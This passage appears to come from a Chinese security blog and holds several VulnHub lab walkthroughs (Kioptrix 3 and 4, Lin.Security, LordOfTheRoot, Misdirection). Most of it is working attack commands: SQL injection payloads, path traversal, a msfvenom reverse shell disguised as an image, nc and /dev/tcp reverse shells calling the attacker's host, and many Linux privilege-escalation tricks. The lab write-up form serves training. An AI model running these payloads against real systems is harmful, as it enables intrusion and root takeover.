<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 union select 1,version(),database(),4,5,6--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/17.jpg" alt="17"></p>
<p>确认表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema&#x3D;&#39;gallery&#39;--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/18.jpg" alt="18"></p>
<p>最后读取密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1%20union%20select%201,username,password,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/19.jpg" alt="19"></p>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>URL地址如下，<code>index</code>参数疑似文件包含漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?page&#x3D;index</span><br></pre></td></tr></table></figure>

<p>尝试文件读取(失败)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>尝试00截断(失败)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br></pre></td></tr></table></figure>

<p>尝试00截断，并添加文件格式关键字(成功)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?system&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00jpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/20.jpg" alt="20"></p>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>主页有一个用户登录页面，通过之前爆出来的账号密码，可以登录到后台<br>用户名:admin<br>密码:n0t7t1k4</p>
<p>后台网址<br>该页面下有提示，链接被注释掉了</p>
<p><img src="/images/Kioptrix-Level-3/21.jpg" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gadmin&#x2F;</span><br></pre></td></tr></table></figure>

<p>制作图片木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;8888 -f raw -o evilshell.jpg</span><br></pre></td></tr></table></figure>

<p>后台存在图片上传点，成功上传图片(图片名称:thumb_8vnes2fe1a.jpg)</p>
<p><img src="/images/Kioptrix-Level-3/22.jpg" alt="22"></p>
<p>之后metasploit开启监听，并访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.251&#x2F;index.php?system&#x3D;..&#x2F;..&#x2F;gallery&#x2F;photos&#x2F;thumb_8vnes2fe1a.jpg%00jpg</span><br></pre></td></tr></table></figure>

<p>由于我们未获得绝对路径，只能通过相对路径多次尝试，最后找到图片马的位置(跨越两层目录)</p>
<p>之后，成功得到meterpreter会话</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>dreg</td>
<td>Mast3r</td>
</tr>
<tr>
<td>loneferret</td>
<td>starwars</td>
</tr>
</tbody></table>
<p>发现上述账号可进行ssh连接<br>在账号<code>loneferret</code>中，发现了一些有趣的信息，它让我执行<code>sudo ht</code></p>
<p><img src="/images/Kioptrix-Level-3/23.jpg" alt="23"></p>
<p>但是这里XTERM貌似不支持256色，需要手动修改一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br><span class="line">loneferret@Kioptrix3:~$ echo $TERM</span><br><span class="line">xterm-256color</span><br><span class="line">loneferret@Kioptrix3:~$ export TERM&#x3D;xterm      </span><br><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br></pre></td></tr></table></figure>

<p>执行成功后，以<code>root</code>打开了一个文本编辑器</p>
<p><img src="/images/Kioptrix-Level-3/24.jpg" alt="24"></p>
<p>修改<code>/etc/passwd</code>的用户标识号：组标识号</p>
<p><img src="/images/Kioptrix-Level-3/25.jpg" alt="25"></p>
<p>之后重新ssh，成功获取root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),100(users)</span><br></pre></td></tr></table></figure>

<p>或者修改<code>/etc/sudoers</code>使当前用户可以无密码使用所有root权限</p>
<p><img src="/images/Kioptrix-Level-3/26.jpg" alt="26"></p>
<p>结果</p>
<p><img src="/images/Kioptrix-Level-3/27.jpg" alt="27"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>之前获取了meterpreter会话，进入模拟shell<br>查看内核版本2.6.24，可以使用脏牛提权</p>
<p>​    <img src="/images/Kioptrix-Level-3/28.jpg" alt="28"></p>
<p>可以使用脏牛提权</p>
<p><img src="/images/Kioptrix-Level-3/29.jpg" alt="29"></p>
<p>40847.cpp编译执行有点问题</p>
<p><img src="/images/Kioptrix-Level-3/30.jpg" alt="30"></p>
<p>40839.c没有问题</p>
<p><img src="/images/Kioptrix-Level-3/31.jpg" alt="31"></p>
<p>成功创建了root账户<br>用户名:firefart<br>密码:toor</p>
<p><img src="/images/Kioptrix-Level-3/32.jpg" alt="32"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix-Level-4</title>
    <url>/2020/05/20/%E9%9D%B6%E5%9C%BAKioptrix-Level-4/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-4"><a href="#Kioptrix-Level-4" class="headerlink" title="Kioptrix_Level_4"></a>Kioptrix_Level_4</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.233</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kioptrix-Level-4/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><h4 id="SMB枚举"><a href="#SMB枚举" class="headerlink" title="SMB枚举"></a>SMB枚举</h4><p>枚举这里遇到一些问题(kali 5.3.0)</p>
<p>enum4linux枚举不了，可能工具太老了，不知道什么问题，换个老版本的kali是可以的</p>
<p>nmap的nse脚本<code>smb_enum_users</code>报错，查看debug信息，找到了一篇同样错误的issues<br>需要修改<code>/usr/share/nmap/nselib/</code>下的<code>msrpc.lua</code>和<code>msrpctypes.lua</code></p>
<blockquote>
<p><a href="https://github.com/nmap/nmap/issues/1707">https://github.com/nmap/nmap/issues/1707</a></p>
</blockquote>
<p><img src="/images/Kioptrix-Level-4/3.jpg" alt="3"></p>
<p>smb枚举似乎没发现太有价值的信息</p>
<h4 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h4><p>首先访问80端口，是一个登录界面</p>
<p><img src="/images/Kioptrix-Level-4/4.jpg" alt="4"></p>
<p>nikto</p>
<p><img src="/images/Kioptrix-Level-4/5.jpg" alt="5"></p>
<p>dirb</p>
<p>这里发现了有意思的地方<br><code>http://192.168.1.233/john/</code>是一个目录</p>
<p><img src="/images/Kioptrix-Level-4/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>在80端口的登录页面，尝试一些常见的闭合符号:<code>) &#39; &quot;</code><br>用户名尝试失败，但密码缺爆出了路径，存在sql注入</p>
<p><img src="/images/Kioptrix-Level-4/7.jpg" alt="7"></p>
<p>之后我使用万能密码进行登录尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>页面发生了一次302后，跳转到这个页面，确认一个盲注</p>
<p><img src="/images/Kioptrix-Level-4/8.jpg" alt="8"></p>
<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>测试发现，可以使用延迟注入，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;4,5,0))-- </span><br></pre></td></tr></table></figure>

<p>也可以使用布尔注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or length(database())&gt;4 #</span><br></pre></td></tr></table></figure>

<p>但手工注入效率太低，就不展示了</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.233&#x2F;checklogin.php&quot; --data&#x3D;&quot;myusername&#x3D;admin&amp;mypassword&#x3D;123&amp;Submit&#x3D;Login&quot; -p mypassword</span><br></pre></td></tr></table></figure>

<p>是否跟随302跳转选NO，也可以得出同样的结论</p>
<p><img src="/images/Kioptrix-Level-4/9.jpg" alt="9"></p>
<p>之后进行<code>-dbs</code>→<code>--tables -D &quot;members&quot;</code>→<code>--dump -T &quot;members&quot; -D &quot;members&quot;</code></p>
<p><img src="/images/Kioptrix-Level-4/10.jpg" alt="10"></p>
<p>成功找出了用户名和密码</p>
<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>利用爆出的用户名和密码尝试ssh连接</p>
<table>
<thead>
<tr>
<th>用户名</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>john</td>
<td>MyNameIsJohn</td>
</tr>
</tbody></table>
<p><img src="/images/Kioptrix-Level-4/11.jpg" alt="11"></p>
<p>连接是成功建立了，不过是一个受限的shell，输入help查看可以使用的命令<br>echo是shell逃逸常用的命令，ubuntu上默认安装了python，我们可以利用echo调用python实现逃逸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-4/12.jpg" alt="12"></p>
<p>但权限和组都是用户，需要提权</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>进入<code>www</code>目录下，查看<code>checklogin.php</code>，成功获取了mysql密码(空)</p>
<p><img src="/images/Kioptrix-Level-4/13.jpg" alt="13"></p>
<p>之后尝试使用UDF提权<br>这里有些奇怪，靶场已经帮你创建好了可执行系统命令的UDF函数，你直接调用就好。。。</p>
<p><img src="/images/Kioptrix-Level-4/14.jpg" alt="14"></p>
<p>提权成功</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Lin.Security</title>
    <url>/2020/09/15/%E9%9D%B6%E5%9C%BALin-Security/</url>
    <content><![CDATA[<h1 id="Lin-Security"><a href="#Lin-Security" class="headerlink" title="Lin.Security"></a>Lin.Security</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<p>这是一台专门练习提权的靶机，有许多种常见方法<br>但这台机器的dhcp有点问题，需要修改一个地方</p>
<p>将<code>/etc/netplan/50-cloud-init.yaml</code>的enp0s3改为ens33即可</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.222 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.222 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>2049端口枚举</p>
<p>挂载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.1.222:&#x2F;home&#x2F;peter &#x2F;tmp&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/2.png" alt="2"></p>
<p>是用户的home目录，可读但不可写</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们已经获取了凭据<code>bob/secret</code></p>
<p>接下来枚举主要通过linpeas，除非必要情况的手动确认</p>
<h3 id="方法1-sudo"><a href="#方法1-sudo" class="headerlink" title="方法1 sudo"></a>方法1 sudo</h3><p>检查sudo权限，这里要输入密码，所以linpeas不能扫出来</p>
<p><img src="/images/Lin.Security/3.png" alt="3"></p>
<p>这里面有很多的命令，很多可以提权，直接查GTFObins就行了</p>
<p>我试过了所有命令，都可以提权</p>
<h3 id="方法2-etc-passwd配置问题"><a href="#方法2-etc-passwd配置问题" class="headerlink" title="方法2 /etc/passwd配置问题"></a>方法2 /etc/passwd配置问题</h3><p>linpeas发现了在/etc/passwd中有一个配置问题(passwd的配置优先级高于shadow)</p>
<p>insecurity被配置为了root权限，且直接把密码写在passwd里了</p>
<p><img src="/images/Lin.Security/4.png" alt="4"></p>
<p>可以是john进行破解</p>
<p><img src="/images/Lin.Security/5.png" alt="5"></p>
<p>su切换过去就是root权限了</p>
<h3 id="方法3-隐藏文件"><a href="#方法3-隐藏文件" class="headerlink" title="方法3 隐藏文件"></a>方法3 隐藏文件</h3><p><img src="/images/Lin.Security/6.png" alt="6"></p>
<p>手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name &quot;.*&quot; -type f -path &quot;&#x2F;home&#x2F;*&quot; -exec ls -la &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>发现了.secret，我们拥有读权限，发现密码MySuperS3cretValue!</p>
<p><code>susan/MySuperS3cretValue!</code></p>
<p>我们现在就获得了另一个用户susan，可以在它用户下运行linpeas</p>
<h3 id="方法4-SUID"><a href="#方法4-SUID" class="headerlink" title="方法4 SUID"></a>方法4 SUID</h3><h4 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h4><p>发现了SUID xxd</p>
<p><img src="/images/Lin.Security/7.png" alt="7"></p>
<p>不过当前用户bob无法运行，发现了组可以执行，查看组内用户包含susan，切换到susan执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd &quot;&#x2F;etc&#x2F;shadow&quot; | xxd -r</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/8.png" alt="8"></p>
<p>可以读取敏感文件，比如root密码的哈希</p>
<p><img src="/images/Lin.Security/9.png" alt="9"></p>
<p>直接破解，这样就可以切换到root了</p>
<p>xxd还提供了写入功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; | xxd | xxd -r - &quot;&#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/10.png" alt="10"></p>
<h4 id="taskset"><a href="#taskset" class="headerlink" title="taskset"></a>taskset</h4><p><img src="/images/Lin.Security/11.png" alt="11"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/12.png" alt="12"></p>
<h3 id="方法5-计划任务-crontab"><a href="#方法5-计划任务-crontab" class="headerlink" title="方法5 计划任务 crontab"></a>方法5 计划任务 crontab</h3><p>linpeas发现</p>
<p><img src="/images/Lin.Security/13.png" alt="13"></p>
<p>手动确认</p>
<p><img src="/images/Lin.Security/14.png" alt="14"></p>
<p>查看内容</p>
<p><img src="/images/Lin.Security/15.png" alt="15"></p>
<p>看来是一个bash脚本，以root权限备份/home下的文件，压缩到/etc/backups</p>
<p>可以使用<strong>tar通配符注入</strong>进行提权，原理是通过通配符注入命令，拼接成tar执行任意命令的形式，原语句如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zcf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>提权方式参考<a href="https://xz.aliyun.com/t/2401%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E6%8D%A2%E4%BB%A5%E4%B8%8Bpayload">https://xz.aliyun.com/t/2401，这里我们换以下payload</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~				&#x2F;&#x2F;根据脚本备份位置，回到用户的主目录下</span><br><span class="line">echo &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.201 53 &gt;&#x2F;tmp&#x2F;f&quot; &gt; shell.sh &amp;&amp;chmod +x shell.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/16.png" alt="16"></p>
<p>等待一下</p>
<p><img src="/images/Lin.Security/17.png" alt="17"></p>
<p>获得反弹shell</p>
<h3 id="方法6-NFS"><a href="#方法6-NFS" class="headerlink" title="方法6 NFS"></a>方法6 NFS</h3><p>之前枚举了NFS可以挂载peter的家目录，但我们进不去，现在我们读取/etc/passwd获取UID和GID，在kali伪造用户</p>
<p><img src="/images/Lin.Security/18.png" alt="18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd -g 1005 evil</span><br><span class="line">adduser evil -uid 1001 -gid 1005</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/19.png" alt="19"></p>
<p>之后重新挂载，这下我们就拥有了完整的权限</p>
<p><img src="/images/Lin.Security/20.png" alt="20"></p>
<p>之后生成密钥对，传输公钥给对方</p>
<p>kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p>对方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC08nu+8DHbVi8+xWGeOU6kq2kgdBHhR1+qjLS&#x2F;vfSQReNXXWiMucl&#x2F;eCkKmyfEsQLDnwxFcInHKHf65MGJYp7stfwmiMM2lH1uWaEk6SNyUrRdCI0RXMC6Ib+VoUWoVKbWkjNhNbLBtSoRocIyuDgbf0IUoVrCdlNox9Dv7Rn8eDvIZAdquc0LZEfgYcfku&#x2F;bQrJ9qr0ZAsz3PTp&#x2F;hU9bcO4BMceOYCj+kGDhjVqvZ7q0J&#x2F;4F0xDgp8H4Be64KyYosEagTzlrlYVvDJ3J5qzKH2lAn0wHR5IooMnyeKZebahkPfqKfrTLPW972fn3JQSPGMdXXUx1ks7YR9r8xyyrO8uJhTWXqBMn7F1OYp0SoN93yBSRMvyTMvyZLPXnkeo02qpb0Z0HQPi69fBADU1MEsVoBrsRa4XtXFOsVRSosqXBkuT79iLvbQN+IDecJSVXhujRqhDIluSpaQKGz+4UYOiGAn8hcMsFTjfsYBQ1amnYkJtBTJkU+TGmU0uhai1M&#x3D; root@kali&#39; &gt; .&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/21.png" alt="21"></p>
<p>登陆成功</p>
<h3 id="方法7-docker"><a href="#方法7-docker" class="headerlink" title="方法7 docker"></a>方法7 docker</h3><p><img src="/images/Lin.Security/22.png" alt="22"></p>
<p>docker组提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure>

<h3 id="方法8-sudo"><a href="#方法8-sudo" class="headerlink" title="方法8 sudo"></a>方法8 sudo</h3><p>我们不知道peter的密码，但peter的sudoers配置是NOPASSWD</p>
<p><img src="/images/Lin.Security/23.png" alt="23"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<h3 id="方法9？-systemd"><a href="#方法9？-systemd" class="headerlink" title="方法9？ systemd"></a>方法9？ systemd</h3><p>这里有点作弊，不是正规手段</p>
<p>检查服务内容</p>
<p><img src="/images/Lin.Security/24.png" alt="24"></p>
<p>返现这个debug.service可写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;debug.service</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/25.png" alt="25"></p>
<p>发现是以root身份运行，我们可以修改ExecStart为我们的恶意脚本</p>
<p><img src="/images/Lin.Security/26.png" alt="26"></p>
<p>修改</p>
<p><img src="/images/Lin.Security/27.png" alt="27"></p>
<p>但是这里有点小作弊，ExecStart需要服务启动时才能加载，我们当前账户不能重启服务后者重启机器<br>反正我就直接重启了虚拟机</p>
<p><img src="/images/Lin.Security/28.png" alt="28"></p>
<p><img src="/images/Lin.Security/29.png" alt="29"></p>
<h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>这里提权都是比较常见的问题，linpeas可以枚举出很多</p>
<p>另外注意，如果能切换用户，应该仔细检查不同的用户信息</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场LordOfTheRoot_1.0.1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BALordOfTheRoot-1-0-1/</url>
    <content><![CDATA[<h1 id="LordOfTheRoot-1-0-1"><a href="#LordOfTheRoot-1-0-1" class="headerlink" title="LordOfTheRoot_1.0.1"></a>LordOfTheRoot_1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.205</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/LordOfTheRoot_1.0.1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ssh连接</p>
<p><img src="/images/LordOfTheRoot_1.0.1/2.png" alt="2"></p>
<p>提示了knockd</p>
<p>尝试敲门</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 1 2 3; do nmap -Pn -p $x 192.168.1.205; done</span><br></pre></td></tr></table></figure>

<p>这种方法这里竟然不行，不知道为什么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -p 1,2,3 192.168.1.205</span><br></pre></td></tr></table></figure>

<p>不搞骚操作是可以的</p>
<p>重新扫描发现1337端口，web服务</p>
<p><img src="/images/LordOfTheRoot_1.0.1/3.png" alt="3"></p>
<p>目录扫描发现了<code>/mordor/</code></p>
<p><img src="/images/LordOfTheRoot_1.0.1/4.png" alt="4"></p>
<p>接着有一段base64</p>
<p><img src="/images/LordOfTheRoot_1.0.1/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/LordOfTheRoot_1.0.1/6.png" alt="6"></p>
<p>尝试sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>成功登录，不过啥也没有，看来这里是要用盲注来获取一些数据了<br>尝试延时注入，成功payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(5)#</span><br></pre></td></tr></table></figure>

<p>盲注特别痛苦，就不手工了，给一个实例的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;2,5,0))#</span><br></pre></td></tr></table></figure>

<p>别忘了提交password参数就行</p>
<p>最后可以爆破出一个表</p>
<p><img src="/images/LordOfTheRoot_1.0.1/7.png" alt="7"></p>
<p>用它们尝试ssh登录</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/LordOfTheRoot_1.0.1/8.png" alt="8"></p>
<p>内核提权</p>
<p>尝试寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit linux kernel 3.19</span><br></pre></td></tr></table></figure>

<p>没有可以用的，反而还把机器给打崩了</p>
<p>换个角度</p>
<p><img src="/images/LordOfTheRoot_1.0.1/9.png" alt="9"></p>
<p>发现</p>
<p><img src="/images/LordOfTheRoot_1.0.1/10.png" alt="10"></p>
<p>39166.c</p>
<p><img src="/images/LordOfTheRoot_1.0.1/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Misdirection 1</title>
    <url>/2020/09/19/%E9%9D%B6%E5%9C%BAMisdirection-1/</url>
    <content><![CDATA[<h1 id="Misdirection-1"><a href="#Misdirection-1" class="headerlink" title="Misdirection 1"></a>Misdirection 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.210</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.210 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.210 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Misdirection-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>对80和8080进行web枚举</p>
<p><img src="/images/Misdirection-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在8080端口发现了debug目录</p>
<p><img src="/images/Misdirection-1/3.png" alt="3"></p>
<p>直接发现了webshell，直接反弹到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Misdirection-1/4.png" alt="4"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo枚举，发现可以以brexit执行/bin/bash</p>
<p><img src="/images/Misdirection-1/5.png" alt="5"></p>
<p>直接切换过去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u brexit &#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

